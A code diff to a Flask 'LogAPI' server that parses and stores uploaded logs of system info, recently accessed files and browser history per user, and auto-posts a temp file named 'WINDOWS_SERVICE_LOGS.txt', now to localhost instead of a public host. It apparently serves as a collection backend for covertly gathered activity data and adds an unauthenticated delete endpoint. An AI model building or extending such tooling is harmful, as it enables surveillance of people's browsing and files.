@@ -3,13 +3,12 @@ import re
 import glob
 import getpass
 import threading
-from unittest import result
+import webbrowser
+import tempfile
 import requests
 from flask import Flask, request, jsonify, render_template
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timezone
-
-from sqlalchemy.engine import result
 
 # ── Flask + DB setup ──────────────────────────────────────────────────────────
 app = Flask(__name__)
@@ -57,7 +56,7 @@ def parse_log(raw: str) -> dict:
                     result["system_info"][k] = v
 
     # RECENTLY ACCESSED FILES
-    rf_match = re.search(r"\[RECENTLY ACCESSED FILES\].*?={10,}(.*?)(?=\n\d{4}-\d{2}-\d{2}|\Z)", raw, re.S)
+    rf_match = re.search(r"\[RECENTLY ACCESSED FILES\].*?={10,}(.*?)(?=\[|\Z)", raw, re.S)
     if rf_match:
         for line in rf_match.group(1).splitlines():
             line = line.strip()
@@ -65,15 +64,13 @@ def parse_log(raw: str) -> dict:
             if fm:
                 result["recent_files"].append({"ext": fm.group(1), "name": fm.group(2).strip()})
 
-    # BROWSER HISTORY — split by profile sections
-    # Each profile section header: [BROWSER HISTORY - PROFILE: <name>]
-    profile_pattern = re.compile(
-        r"\[BROWSER HISTORY - PROFILE:\s*(.+?)\].*?={10,}(.*?)(?=\[BROWSER HISTORY - PROFILE:|\Z)",
-        re.S
-    )
+    # BROWSER HISTORY — supports both profile sections and plain [BROWSER HISTORY]
     all_history = []
+    profile_pattern = re.compile(
+        r"\[BROWSER HISTORY(?:\s*-\s*PROFILE:\s*(.+?))?\].*?={10,}(.*?)(?=\[|\Z)", re.S
+    )
     for pm in profile_pattern.finditer(raw):
-        profile_name = pm.group(1).strip()
+        profile_name = (pm.group(1) or "Default").strip()
         profile_raw  = pm.group(2)
         entries = re.split(r"\n(?=\[\d+\])", profile_raw)
         profile_entries = []
@@ -97,9 +94,7 @@ def parse_log(raw: str) -> dict:
             all_history.append(entry)
         result["browser_profiles"][profile_name] = profile_entries
 
-    # Keep flat list for backwards compatibility
     result["browser_history"] = all_history
-
     return result
 
 
@@ -134,8 +129,9 @@ def get_data():
 
 @app.route("/users", methods=["GET"])
 def list_users():
-    entries = (LogEntry.query.order_by(LogEntry.received_at.desc()).all())
-    return jsonify({"entries": [e.to_dict() for e in entries]})
+    rows = (db.session.query(LogEntry.user_id, db.func.count(LogEntry.id))
+                      .group_by(LogEntry.user_id).all())
+    return jsonify({"users": [{"user_id": r[0], "log_count": r[1]} for r in rows]})
 
 
 @app.route("/parse", methods=["GET"])
@@ -160,23 +156,24 @@ def parse_entry():
     return jsonify(parsed)
 
 
+@app.route("/clear", methods=["DELETE"])
+def clear_data():
+    db.session.query(LogEntry).delete()
+    db.session.commit()
+    return jsonify({"message": "All data cleared"})
+
+
 @app.route("/")
 def dashboard():
     return render_template("dashboard.html")
 
 
-# ── Auto-detect & send ────────────────────────────────────────────────────────
+# ── Auto-detect & send (LOCAL ONLY) ──────────────────────────────────────────
 def detect_and_send():
     import time
-    import tempfile
     time.sleep(1.5)
 
-    base_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("PUBLIC_BASE_URL")
-    if not base_url:
-        print("[AUTO-SEND] Public base URL not configured — skipping.")
-        return
-
-    temp_dir = os.environ.get("TEMP") or os.environ.get("TMP") or tempfile.gettempdir()
+    temp_dir = os.environ.get("TEMP") or tempfile.gettempdir()
     log_file = os.path.join(temp_dir, "WINDOWS_SERVICE_LOGS.txt")
 
     if not os.path.isfile(log_file):
@@ -193,7 +190,7 @@ def detect_and_send():
     print(f"[AUTO-SEND] File : {log_file}")
 
     try:
-        resp = requests.post(f"{base_url.rstrip('/')}/data",
+        resp = requests.post("http://localhost:5000/data",
                              json={"user_id": user_id, "data": content}, timeout=10)
         if resp.status_code == 201:
             print(f"[AUTO-SEND] ✓ Stored as entry #{resp.json()['id']}")
@@ -206,19 +203,15 @@ def detect_and_send():
 def open_browser():
     import time
     time.sleep(2)
-    base_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("PUBLIC_BASE_URL")
-    if base_url:
-        import webbrowser
-        webbrowser.open(base_url)
+    webbrowser.open("http://localhost:5000")
 
 
 # ── Entry point ───────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     print("=" * 50)
-    print("  LogAPI  →  Render deployment")
+    print("  LogAPI  →  http://localhost:5000")
     print("=" * 50)
-    if os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("PUBLIC_BASE_URL"):
-        threading.Thread(target=detect_and_send, daemon=True).start()
-        threading.Thread(target=open_browser, daemon=True).start()
-    port = int(os.environ.get("PORT", "5000"))
-    app.run(debug=False, host="0.0.0.0", port=port)
+    # auto-send and browser only run locally, not on Render (gunicorn skips this block)
+    threading.Thread(target=detect_and_send, daemon=True).start()
+    threading.Thread(target=open_browser,    daemon=True).start()
+    app.run(debug=False, host="0.0.0.0", port=5000)
